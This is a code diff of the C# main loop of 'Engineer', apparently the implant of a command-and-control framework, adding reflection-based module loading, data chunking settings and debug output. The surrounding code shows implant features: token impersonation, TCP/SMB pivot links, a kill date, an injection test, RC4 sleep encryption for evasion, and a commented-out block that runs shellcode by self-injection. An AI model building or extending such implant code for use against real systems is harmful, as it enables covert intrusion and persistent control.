@@ -1,14 +1,18 @@
-﻿using Engineer.Commands;
+﻿using DynamicEngLoading;
+using Engineer.Commands;
 using Engineer.Functions;
 using Engineer.Models;
 using System;
+using System.CodeDom.Compiler;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Reflection;
+using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
@@ -23,7 +27,7 @@ namespace Engineer
         internal static EngineerMetadata _metadata;
         internal static WindowsIdentity ImpersonatedUser;
         internal static bool ImpersonatedUserChanged = false;
-        internal static List<EngineerCommand> _commands = new List<EngineerCommand>(); // Assigned here because its not assigned in main so assigning it somewhere else would localsize the assignment other 3 are assigned the objects in Main func.
+        internal static List<IEngineerCommand> _commands = new List<IEngineerCommand>(); // Assigned here because its not assigned in main so assigning it somewhere else would localsize the assignment other 3 are assigned the objects in Main func.
         public static string ManagerType = "{{REPLACE_MANAGER_TYPE}}";
         public static ConcurrentDictionary<string, EngTCPComm> TcpChildCommModules = new ConcurrentDictionary<string, EngTCPComm>(); // key is the current engineers children engineerId, value is the TCP comm, for that child
         public static ConcurrentDictionary<string, EngSMBComm> SmbChildCommModules = new ConcurrentDictionary<string, EngSMBComm>(); // key is the current engineers children engineerId, value is the smb comm, for that child
@@ -42,12 +46,21 @@ namespace Engineer
         public static DateTime LastP2PCheckIn = DateTime.Now;
         public static string ImplantType = "{{REPLACE_IMPLANT_TYPE}}";
         public static DateTime killDate = DateTime.TryParse("{{REPLACE_KILL_DATE}}", out killDate) ? killDate : DateTime.MaxValue;
+        public static List<Type> typesWithModuleAttribute;
+        public static bool IsDataChunked = bool.TryParse("{{REPLACE_CHUNK_DATA}}", out IsDataChunked) ? IsDataChunked : false;
+        public static int ChunkSize = int.TryParse("{{REPLACE_CHUNK_SIZE}}", out ChunkSize) ? ChunkSize : 0;
+        public static int DownloadChunkSize = int.TryParse("{{REPLACE_DOWNLOAD_CHUNK_SIZE}}", out DownloadChunkSize) ? DownloadChunkSize : 500000; // 500KB
 
         public static async Task Main(string[] args)
         {
             try
             {
                 //PrimeCalc();
+                // Register the implementations
+                IForwardingFunctions taskingWrapper = new ForwardedFunctionWrappers();
+                DynamicEngLoading.ForwardingFunctions.ForwardingFunctionWrap = taskingWrapper;
+                AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
+                typesWithModuleAttribute = Assembly.GetExecutingAssembly().GetTypes().Where(t => t.GetCustomAttribute(typeof(ModuleAttribute)) is ModuleAttribute attr).ToList();
                 if (ManagerType.Equals("smb", StringComparison.CurrentCultureIgnoreCase))
                 {
                     if (childIsServer)
@@ -112,6 +125,11 @@ namespace Engineer
 
                 bool isInjected = Functions.InjectionTest.Injection_Test();
                 
+                //DEBUG REMOVE LATER
+                //var testshell = File.ReadAllBytes("D:\\Share between vms\\calc_shellcode.bin");
+                //Task.Run(async () => Extra.Inj_techs.SelfAllocCreateThread(testshell));
+                //DEBUG END
+
                 _tokenSource = new CancellationTokenSource();
                 while (!_tokenSource.IsCancellationRequested) // if Teamserver isnt up or goes down while eng is running it gets stuck in this loop
                 {
@@ -201,7 +219,23 @@ namespace Engineer
                             IsEncrypted = true;
                             if (Sleeptype == SleepEnum.SleepTypes.Custom_RC4)
                             {
-                                Functions.SleepEncrypt.ExecuteSleep(EngCommBase.Sleep); //if we did not recvData and we have no data to send sleep for a bit
+                                //make sure the SleepEncrypt class is loaded, we can use the custom Module attribute
+                                if (typesWithModuleAttribute.Where(attr => attr.Name.Equals("SleepEncrypt", StringComparison.OrdinalIgnoreCase)).Count() > 0)
+                                {
+                                    //Functions.SleepEncrypt.ExecuteSleep(EngCommBase.Sleep); //if we did not recvData and we have no data to send sleep for a bit
+                                    var sleepEncryptModule = typesWithModuleAttribute.ToList().Find(x => x.Name.Equals("SleepEncrypt",StringComparison.OrdinalIgnoreCase));
+                                    // Get the method
+                                    var method = sleepEncryptModule.GetMethod("ExecuteSleep", BindingFlags.Public | BindingFlags.Static);
+                                    if (method != null)
+                                    {
+                                        // Call the method , first argument is null because it's a static method
+                                        method.Invoke(null,new object[] { EngCommBase.Sleep });
+                                    }
+                                }
+                                else
+                                {
+                                    Thread.Sleep(EngCommBase.Sleep);
+                                }
                             }
                             else if(Sleeptype == SleepEnum.SleepTypes.None)
                             {
@@ -255,16 +289,16 @@ namespace Engineer
                     }
                     catch (Exception ex)
                     {
-                       //Console.WriteLine(ex.Message);
-                       //Console.WriteLine(ex.StackTrace);
+                       Console.WriteLine(ex.Message);
+                       Console.WriteLine(ex.StackTrace);
                     }
                 }
                 Stop();
             }
             catch (Exception e)
             {
-               //Console.WriteLine(e.Message);
-               //Console.WriteLine(e.StackTrace);
+               Console.WriteLine(e.Message);
+               Console.WriteLine(e.StackTrace);
             }
         }
 
@@ -336,7 +370,24 @@ namespace Engineer
             }
             catch { }
         }
-        
-        
+
+        private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
+        {
+            try
+            {
+                // If the requested assembly is the merged DynamicEngLoading assembly, return the current assembly
+                if (args.Name.StartsWith("DynamicEngLoading"))
+                {
+                    return Assembly.GetExecutingAssembly();
+                }
+                return null;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                return null;
+            }
+
+        }
     }
 }
